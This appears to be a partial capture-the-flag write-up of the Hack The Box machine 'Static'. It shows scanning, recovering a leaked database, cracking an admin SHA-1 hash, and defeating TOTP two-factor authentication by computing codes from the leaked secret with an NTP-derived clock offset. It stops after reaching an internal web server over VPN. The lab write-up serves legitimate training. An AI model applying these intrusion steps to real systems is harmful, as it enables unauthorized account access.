> Author: **[ompamo][author-profile]**

## Discovery

### Port Scanning

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
```

```bash
PORT    STATE SERVICE
123/udp open  ntp
```

### Web Browsing

`http://10.10.10.246:8080` is blank ?!

Still there's a `robots.txt` file:

```
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

There's a compresed database, and a warning:

```
Binary files are being corrupted during transfer!!! Check if are recoverable.
```

Indeed:

```bash
gunzip db.sql.gz 
# gzip: db.sql.gz: invalid compressed data--crc error
# gzip: db.sql.gz: invalid compressed data--length error
```

## Break-in

### Mining the Archive

The corrupted archive can be fixed with [`fixgz`][fixgz], the official recovery tool
from gzip:

```bash
git clone https://github.com/yonjar/fixgz && cd fixgz
g++ fixgz.cpp -o fixgz
./fixgz db.sql.gz db.sql.fixed.gz
gunzip db.sql.fixed.gz && mv db.sql.fixed db.sql
cat db.sql
# INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );
```

Next:

```bash
hashid d033e22ae348aeb5660fc2140aec35850c4da997
# [+] SHA-1 
# [+] Double SHA-1 
# [+] RIPEMD-160 
# [+] Haval-160 
# [+] Tiger-160 
# [+] HAS-160 
# [+] LinkedIn 
# [+] Skein-256(160) 
# [+] Skein-512(160)
hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997
# Possible Hashs:
# [+] SHA-1
# [+] MySQL5 - SHA-1(SHA-1($pass))

# Least Possible Hashs:
# [+] Tiger-160
# [+] Haval-160
# [+] RipeMD-160
# [+] SHA-1(HMAC)
# [+] Tiger-160(HMAC)
# [+] RipeMD-160(HMAC)
# [+] Haval-160(HMAC)
# [+] SHA-1(MaNGOS)
# [+] SHA-1(MaNGOS2)
# [+] sha1($pass.$salt)
# [+] sha1($salt.$pass)
# [+] sha1($salt.md5($pass))
# [+] sha1($salt.md5($pass).$salt)
# [+] sha1($salt.sha1($pass))
# [+] sha1($salt.sha1($salt.sha1($pass)))
# [+] sha1($username.$pass)
# [+] sha1($username.$pass.$salt)
# [+] sha1(md5($pass))
# [+] sha1(md5($pass).$salt)
# [+] sha1(md5(sha1($pass)))
# [+] sha1(sha1($pass))
# [+] sha1(sha1($pass).$salt)
# [+] sha1(sha1($pass).substr($pass,0,3))
# [+] sha1(sha1($salt.$pass))
# [+] sha1(sha1(sha1($pass)))
# [+] sha1(strtolower($username).$pass)
john -w /usr/share/wordlists/passwords/rockyou-70.txt admin.hash
```

> admin admin...

### Bypassing 2FA

These credentials work on `http://10.10.10.246:8080/vpn/login.php`, but the
server asks for a 2FA code.

Hopefully the DB provided `totp`, the secret for the OTP generation. More
precisely a time based OTP, TOTP.


The PHP module [otphp][otphp] can process the secret and output a OTP, but
it fails when entered.

I tried several methods and they all failed until I scrolled this very doc
and noticed the NTP service on the UDP scan: the OTP is framed in time and
my clock wasn't synchronized...

Since my machine won't sync with the server, another solution is to input the
time delta with the server manually when generating the OTP.

```bash
ntpdate -vd 10.10.10.246
#  6 Nov 10:55:24 ntpdate[4259]: ntpdate 4.2.8p15@1.3728-o Wed Jul  1 17:02:17 UTC 2020 (1)
# Looking for host 10.10.10.246 and service ntp
# 10.10.10.246 reversed to static.htb
# host found : static.htb
# transmit(10.10.10.246)
# receive(10.10.10.246)
# 10.10.10.246: Server dropped: strata too high
# stratum 16, precision -24, leap 11, trust 000
# refid [INIT], root delay 0.000000, root dispersion 0.040192
# reference time:      (no time)
# originate timestamp: e531074e.727fed58  Sat, Nov  6 2021 14:53:18.447
# transmit timestamp:  e53103b8.2692fc06  Sat, Nov  6 2021 14:38:00.150
# filter delay:  0.18254    0.22990    0.09621    0.09340   
#                ----       ----       ----       ----      
# filter offset: +918.23436 +918.30527 +918.26238 +918.26256
#                ----       ----       ----       ----      
# delay 0.09340, dispersion 0.01247, offset +918.262565
 cat otp.php 
# <?php
# include 'otphp/lib/otphp.php';

# $totp = new \OTPHP\TOTP("orxxi4c7orxwwzlo");
# echo $totp->at(time() + 918.23436);
# ?>
php otp.php | xclip -sel clipboard
```

Another solution I tried was to manually add the clock delta to my system time:

```bash
sudo timedatectl set-time $(date -d "@$(( $(date +%s) + 918))" +"%T")
```

A detail that took most of my time...

## Lateral Movement

We download the "web" VPN and add the corresponding `vpn.static.htb`.

At first it failed with:

```
2021-11-06 19:44:04 failed to find GID for group nogroup
2021-11-06 19:44:04 Exiting due to fatal error
```

This fixed it:

```bash
perl -pe "s#group nogroup#group nobody#g" web.ovpn
```

```bash
ip address
# 8: tun9: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
#     link/none 
#     inet 172.30.0.9/16 scope global tun9
#        valid_lft forever preferred_lft forever
#     inet6 fe80::ff:1b39:830:7858/64 scope link stable-privacy 
#        valid_lft forever preferred_lft forever
ip route add 172.20.0.0/24 dev tun9
```

Then an internal webserver is exposed:

![][phpinfo]

[author-profile]: https://app.hackthebox.com/users/9631

[otphp]: https://github.com/lelag/otphp
[fixgz]: https://github.com/yonjar/fixgz
[phpinfo]: images/screenshots/phpinfo.png
